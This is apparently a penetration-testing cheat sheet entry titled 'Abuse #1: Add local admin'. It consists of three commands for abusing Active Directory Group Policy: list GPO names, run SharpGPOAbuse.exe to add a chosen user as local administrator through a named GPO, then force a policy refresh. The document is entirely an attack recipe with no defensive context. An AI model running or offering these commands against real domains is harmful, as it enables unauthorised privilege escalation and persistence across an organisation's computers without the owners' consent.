Abuse #1: Add local admin

1. List GPOs Name

Get-GPO -All | Select-Object DisplayName

2. Add localAdmin

.\SharpGPOAbuse.exe --AddLocalADmin --UserAccount <USER> --GPOName <GPO_NAME>

3. Force reload

gpupdate /force
